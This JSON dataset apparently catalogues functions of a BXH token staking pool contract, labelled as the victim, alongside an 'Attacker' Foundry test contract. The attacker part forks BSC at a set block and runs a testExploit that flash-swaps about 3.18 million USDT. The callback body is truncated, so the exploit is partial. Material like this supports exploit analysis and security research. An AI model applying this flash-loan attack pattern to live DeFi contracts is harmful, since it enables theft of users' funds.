[
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "add",
    "original_code": "    function add(uint x, uint y) internal pure returns (uint z) {\n        require((z = x + y) >= x, 'ds-math-add-overflow');\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "adminAddress",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "batchPrepareRewardTable",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "claimAllReward",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "claimBylpToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "decayPeriod",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "decayRatio",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "decayTable",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "delegateCaller",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "depositByDelegate",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "emergencyWithdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "getITokenBlockRewardV",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "getITokenBonusAmount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "iToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "lockedToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "massUpdatePools",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "openDelegate",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "paused",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "pending",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "pendingAllReward",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "pendingBylpToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "phase",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "poolInfo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "poolLength",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "renounceOwnership",
    "original_code": "    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "rewardV",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "safeGetITokenBlockReward",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "set",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "setAdmin",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "setBonus",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "setDecayPeriod",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "setDecayRatio",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "setDelegate",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "setPause",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "setPoolDepositLimited",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "setTokenPerBlock",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "startBlock",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "tokenPerBlock",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "totalAllocPoint",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "transferOwnership",
    "original_code": "    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "updatePool",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "userDepositInfo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "userInfo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "withdrawBylpToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "withdrawEmergency",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "TokenStakingPoolDelegate",
    "source_type": "victim_contract",
    "function_name": "withdrawEmergencyNative",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 21_727_289);\n        cheat.label(address(BXH), \"BXH\");\n        cheat.label(address(usdt), \"USDT\");\n        cheat.label(address(wbnb), \"WBNB\");\n        cheat.label(address(pancakeRouter), \"PancakeRouter\");\n        cheat.label(address(usdtwbnbpair), \"usdt/wbnb Pair\");\n        cheat.label(address(bxhusdtpair), \"bxh/usdt Pair\");\n        cheat.label(address(bxhRouter), \"BXH Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Before attack need deposit first\n\n        // cheat.rollFork(21665464);\n        // cheat.prank(0x81C63d821b7CdF70C61009A81FeF8Db5949AC0C9);\n\n        // //emit log_named_decimal_uint(\"[Start]  VUSDT Balance Of 0x54f611135A9b88bbE23a8CF6C1310c59321F2717:\", vUSDT.balanceOf(address(0x54f611135A9b88bbE23a8CF6C1310c59321F2717)), 18);\n        // vUSDT.transfer(address(this), 5582000000000000000000);\n        // emit log_named_decimal_uint(\"[Start] contract VUSDT Balance is:\", vUSDT.balanceOf(address(this)), 18);\n\n        // vUSDT.approve(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, type(uint256).max);\n\n        // bxhtokenstaking.deposit(0, vUSDT.balanceOf(address(this)));\n        // emit log_named_decimal_uint(\"[Start] contract Despoit VUSDT \", vUSDT.balanceOf(address(this)), 18);\n\n        //cheat.rollFork(21727289);\n\n        emit log_named_decimal_uint(\n            \"[Start] BXH-USDT  Pair USDT Balance is :\",\n            usdt.balanceOf(address(0x919964B7f12A742E3D33176D7aF9094EA4152e6f)),\n            18\n        );\n        usdtwbnbpair.swap(3_178_800_000_000_000_000_000_000, 0, address(this), \"0x\");\n\n        emit log_named_decimal_uint(\"[Over] Hacker USDT Balance is :\", usdt.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]